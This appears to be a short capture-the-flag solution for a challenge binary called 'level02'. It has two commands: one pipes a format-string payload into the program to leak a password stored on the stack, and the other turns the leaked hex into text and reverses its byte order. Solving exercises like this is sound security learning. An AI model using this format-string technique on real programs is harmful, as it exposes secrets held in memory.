## Command to find password as stored on stack:
## (python -c 'print("%26$p%25$p%24$p%23$p%22$p")'; python -c 'print("password")'; cat) | ~/level02

## Convert password. Hex to ascii, reverse endian:
echo 0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 | xxd -r -p | rev
